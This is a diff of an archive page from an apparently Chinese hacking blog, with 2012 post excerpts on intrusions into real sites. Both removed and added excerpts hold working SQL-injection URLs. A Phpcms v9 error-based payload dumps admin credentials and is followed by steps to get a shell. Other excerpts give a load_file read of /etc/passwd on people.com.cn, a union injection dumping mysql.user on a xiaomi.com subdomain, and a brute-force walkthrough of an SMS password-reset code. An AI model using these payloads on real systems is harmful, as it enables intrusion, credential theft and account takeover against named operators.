@@ -45,27 +45,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-09T06:24:45.000Z" itemprop="datePublished">
-          2012-09-09
+      <time datetime="2012-12-05T19:15:26.000Z" itemprop="datePublished">
+          2012-12-06
       </time>
     
     
     | 
-    <a href='/tag/银行/'>银行</a>
+    <a href='/tag/fckeditor/'>fckeditor</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/813.seo/">路过杭州某银行查询机</a></h2>
+      <h2 class="post-title"><a href="/950.seo/">最新FCKEditor ASP上传绕过漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        我就是进去办办业务取号等的时候看到台查询机，顺手一下，什么都没做…  Win2000的系统啊 真老了     后面探头好多还有工作人员，赶紧抓拍完了收工~
+        exploiut-db：  FCKEditor ASP Version 2.6.8 File Upload Protection Bypass   - Title: FCKEditor 2.6.8 ASP Version File Upload Protection bypass    - Credit goes to: Mostafa Azizi, Soroush Dalili     - Link:http://sourceforg
       
       </p>
       
       <p>
-          <a href="/813.seo/" class="excerpt-link">Read More...</a>
+          <a href="/950.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -74,31 +74,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
-          2012-09-07
+      <time datetime="2012-12-04T23:11:25.000Z" itemprop="datePublished">
+          2012-12-05
       </time>
     
     
     | 
-    <a href='/tag/SQL注入/'>SQL注入</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/0day/'>0day</a>,
+    <a href='/tag/TCP链路劫持/'>TCP链路劫持</a>,
     
-    <a href='/tag/Phpcms/'>Phpcms</a>
+    <a href='/tag/ARP/'>ARP</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
+      <h2 class="post-title"><a href="/949.seo/">链路劫持攻击一二三</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
+        博文作者：lake2 [ TSRC ]  发布日期：2012-11-09  博文内容：  随着应用安全的发展，大家都比较关注应用安全漏洞，其实在应用层之下的传输层也有很多安全风险，而且这些安全风险正在被广泛利用。比如今天要给大家介绍的TCP链路劫持攻击。  TCP链路劫持其实就是指网络链路上侦听、伪造TCP包，达到控制目标网络链路的行为。最常见的就是某些设备实现的对非法站点的访问拦截，以及一些地区运营商的网页植入广告行为。  因为广域网
       
       </p>
       
       <p>
-          <a href="/808.seo/" class="excerpt-link">Read More...</a>
+          <a href="/949.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -107,29 +107,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:14:46.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-11-24T12:49:46.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
     <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/穿山甲/'>穿山甲</a>,
+    
+    <a href='/tag/盲注/'>盲注</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/804.seo/">某官网的渗透笔记</a></h2>
+      <h2 class="post-title"><a href="/948.seo/">从Jannock渗透小米科技(xiaomi.com)说起</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        原文：http://26836659.blogcn.com/articles/%E6%9F%90%E5%AE%98%E7%BD%91%E7%9A%84%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html某官网的渗透笔记，挖掘的某0DAY拿到webshell，USER权限，联通外网，提权SYSTEM的EXP无效，看来打的补丁很全，服务器用的是微软FTP,MSSQL，没啥突破口。路过其他盘，发现一个小有年份的B
+        过年的时候在家无聊，适逢wooyun开站,于是去看了看，居然看到有人12月份发了小米科技渗透的过程。仔细看了看，非常经典的一次渗透过程，其中注入,上传,社工基本上是无缝结合。现在渗透在外面，有些人看来似乎没有什么技术含量，有些人则认为高不可及，那么从这个渗透的案例，我来解答下相关的技术点。看看大家掌握了多少。    首先,作者是从http://xshare.api.xiaomi.com/xShare?do=list2&amp;choic
       
       </p>
       
       <p>
-          <a href="/804.seo/" class="excerpt-link">Read More...</a>
+          <a href="/948.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -138,27 +140,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:13:33.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-11-24T12:47:07.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/小米/'>小米</a>,
+    
+    <a href='/tag/密码/'>密码</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/801.seo/">Bluecms漏洞大集合</a></h2>
+      <h2 class="post-title"><a href="/947.seo/">小米科技成功渗透进内部网络</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>既然论坛都整改了，把我所有所有的JB都清空了。大家有0day都舍不得放出来，好吧，从我开始吧，把我挖的0day都放出来了。希望大家有0day的都放出来。别藏着了，藏着Mjj了。   <br />&#160;&#160; Bluecms也就是从一个公司教程看到的cms，然后想了想，既然那里面拿来做教程，我就挖挖这套cms<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，我也没深挖到底，也没能坚持把代码看完。但是已经发现了很多很多的问题。其实能拿到shell就可以了。    <br />&#160;&#160; author： 西毒    <br />来自 :<a href="http://hi.baidu.com/sethc5/blog">http://hi.baidu.com/sethc5/blog</a>    <br /><a href="http://img.cker.in/Bluecms_F32/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Bluecms_F32/clip_image001_thumb.jpg" width="644" height="594" /></a></p>
+        <p>By Jannock@wooyun</p>  <p>简要描述：</p>  <p>首先   <br /><a href="http://www.wooyun.org/bugs/wooyun-2010-03608">http://www.wooyun.org/bugs/wooyun-2010-03608</a>    <br />对这位兄弟表示羡慕嫉妒。正好今天有空，再一次对小米科技的网络进行<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>。    <br />说实话，发表这篇东西时，表示有点害怕，已经不是在想能不能获取手机的问题了。    <br />本次渗透只进行到进入内部网络与某官网服务器。本次<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>很值得用统一<a href="http://ha.cker.in/tag/密码" target="_blank">密码</a>的人思考。</p>  <p>详细说明：</p>  <p>首先从某分站<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>点开始    <br /><a href="http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot">http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot</a>    <br />些注入点表示已经通知过官方，但可以是已经弃用的部分网站，所以一直还没处理。于是<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>就从此处开始。    <br />由于是root ,拿shell <a href="http://xshare.api.xiaomi.com/rso/1.php">http://xshare.api.xiaomi.com/rso/1.php</a></p>  <p><a href="http://img.cker.in/de675513837a_432C/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/de675513837a_432C/clip_image001_thumb.jpg" width="672" height="460" /></a></p>  <p>事实也证明，此服务器没什么用途，和官方<a href="http://ha.cker.in/tag/电商" target="_blank">电商</a>网络跟离差远。不过此处还是存在几个分站网站。    <br />连续数据库    <br />数据库中没什么可以关注的信息，最具重要的数据库是：ucenter ，当然，这个是弃用的数据库，用户数据不是最新，但是可以作为很好的渗透的<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a>。</p><br>
       
       </p>
       
       <p>
-          <a href="/801.seo/" class="excerpt-link">Read More...</a>
+          <a href="/947.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -167,27 +173,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:00:39.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-11-24T12:30:54.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
-    <a href='/tag/检测/'>检测</a>
+    <a href='/tag/提权/'>提权</a>,
+    
+    <a href='/tag/检测/'>检测</a>,
+    
+    <a href='/tag/权限/'>权限</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/799.seo/">授权友情检测51cto</a></h2>
+      <h2 class="post-title"><a href="/946.seo/">友情检测张柏芝官方网站全过程</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        应51cto公司人员邀请   本小组shell2me对51cto.com整站进行一个黑盒安全测试    只进行友情检测，不对51cto旗下任何网站进行破坏性行为    51cto将提供其公司纪念奖品，以及感谢信，作为发现漏洞奖励    启动时间为2011年12月23日 21：30   shell2me参与友情检测人员名单(排名不分先后)：     Jesus     Jacks     神刀     星轨     Mix、小拽     
+        <p>声明：原创文章，转载请注明来自哈客部落(<a href="http://www.hake.cc/">www.hake.cc</a>），违者必究！    <br />from: <a href="http://www.hacke.cc/">www.hacke.cc</a>    <br />今天一时兴起,想太阳个明星的官网玩玩    <br />这不,心里一思量就想到了我们的柏芝姐姐从前,有一个美女…. 吖的。跑题了,, 回来    <br />我们继续~~    <br />百度找到张柏芝的官网    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image001_thumb.png" width="320" height="92" /></a>    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image003_thumb.jpg" width="620" height="243" /></a>    <br />简略的踩点了一下。发现大部分都是html的静态页面,也没办法下手。看这外观又有点像某个cms的样子。    <br />随即想看看googlehack能不能找到后台地址。查出程序版本..好对症下药！    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image005_thumb.jpg" width="620" height="386" /></a>    <br />看到了把，懂得人都知道这是目录遍历。同时还发现了网站有用aspx的语言程序。</p><br>
       
       </p>
       
       <p>
-          <a href="/799.seo/" class="excerpt-link">Read More...</a>
+          <a href="/946.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -196,29 +206,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T08:59:18.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-11-24T09:06:39.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
-    <a href='/tag/注入/'>注入</a>,
+    <a href='/tag/暴力破解/'>暴力破解</a>,
     
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/burpsuit/'>burpsuit</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/797.seo/">从分析代码学习挖掘漏洞人民网实例</a></h2>
+      <h2 class="post-title"><a href="/945.seo/">Burpsuit暴力破解某运营商手机邮箱密码 已发乌云</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><a href="http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537&amp;fromuid=4372">http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537</a></p>  <p>作者注：   <br />近日看到论坛上有人发了个“全能大牛”的文章，颇有感慨。其实所谓的“全能”，是来自对基础知识的扎实根基。本文虽谈不上“全能”，也并非什么大做，仅为证明只要根基扎实，你也可以“全能”渗透。    <br />本文特意选用人民网(people.com.cn)中的某一服务器上Web站点作为讲解实例，详细讲述如何根据一个小漏洞逐步分析，扩大范围完成进一步渗透的。    <br />本文仅供研究和学习，不得用于非法用途，否则后果自负。    <br />出于隐私保护的目的，文章所有截图和url经过处理。    <br />本文版权所有，转载请注明出处：Silic Group Hacker Army [BlackBap.Org]    <br />作者：YoCo Smart    <br />来自：Silic Group    <br />站点：<a href="http://blackbap.org/">Http://blackbap.org</a>    <br />相信很多人已经厌倦了这个网络里弥漫的注入，弱口令，万能密码。那么有没有遇到过注入找不到后台，数据库为root或者sa账户却无法写入webshell，得到了后台却拿不到webshell，拿到了webshell却无法提权？？？？？    <br />本文所阐述的例子是：    <br />一台Linux服务器是用了Apache 2.2.10架设了php的网站，数据库为MySQL，网站使用了root账户，但是网站没有后台，也没有phpMyAdmin，服务器中存在一个注入点。因为gpc为on，所以无法写入webshell，但是可以读取服务器上一些已知路径的文件。    <br />那么我们就通过本文来讲一下，如何通过这个注入点，进行下一步渗透的。    <br />我们先来简单描述一下注入点(如果不懂php+MySQL的注入，请参见《<a href="http://bbs.blackbap.org/thread-2433-1-1.html">各色SQL注入文章汇总</a>》)    <br />注入点：</p>  <p><em>.people.com.cn/vote.php?id=3</p>  <p>这个注入点根据存在的文件名就知道，应该是一个投票页面，因为union只有一个字段，所以直接</p>  <p></em>.people.com.cn/vote.php?id=3+union+select+load_file(0x2f6574632f706173737764)+from+mysql.user</p>  <p>就能读到文件了。根据错误回显，得到网站路径为/usr/www。因为gpc设置on，所以</p>  <p>union select 一句话的hex into outfile ‘/usr/www/可写目录/webshell.php’</p>  <p>这样是得不到webshell的，查到MySQL.user中设置的host为%，但是这台服务器对外网实际并未开放3306端口，也无法外联。   <br />那么思路是什么呢？    <br />我们来试着读取网站文件的源码来查找一些其他的漏洞。    <br /></p>
+        <p>一篇教新手使用神器Burpsuit的暴力破解的教程，因为是新手入门所以写的尽量详细易懂，我也是菜鸟同学，希望投稿能通过了和大家一起交流。~~好吧，其实我是来搞基的！</p>  <p>找回密码时会给手机发送六位数字验证码，纯数字大家都懂的 可以暴力破解</p>  <p>于是我就祭出神器Burpsuit试试看，一试果然可以暴力破解，没有加任何限制，破出来验证码拿去改密码进邮箱，对于把重要信息存在邮箱上的用户来说密码已经形同虚设了，一点安全性都没有，所以说危害还是很严重的。</p>  <p>由于是拿自己的手机测试的，所以验证码是24<em>**</em>，我直接用240000-250000的字典跑了下，成功了后又用000000-999999的字典跑，两次测试证明漏洞确实存在。</p>  <p>详细过程：</p>  <p>找回密码页面</p>  <p>来到mail.wo.com.cn找回密码，打开Burpsuit设置好代理并OFF截包</p>  <p><a href="http://img.cker.in/Burpsuit_E96/clip_image002.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Burpsuit_E96/clip_image002_thumb.jpg" width="596" height="490" /></a></p>  <p>输入一个简单的新密码，短信验证码随便填，我这里填123456，提示验证码错误，然后来到神器的history看刚才的POST请求包</p>  <p><a href="http://img.cker.in/Burpsuit_E96/clip_image004.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Burpsuit_E96/clip_image004_thumb.jpg" width="596" height="614" /></a></p>  <p>嗯，就是这个包，序号是4611</p>  <p>我们选中，然后点send intruder发送到爆破</p><br>
       
       </p>
       
       <p>
-          <a href="/797.seo/" class="excerpt-link">Read More...</a>
+          <a href="/945.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -226,7 +236,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/2012/page/2/">← Newer Posts</a>
-    <span class="page-number">Page 3 of 29</span>
+    <span class="page-number">Page 3 of 40</span>
     <a class="older-posts" href="/archives/2012/page/4/">Older Posts →</a>
   </nav>
 </main>
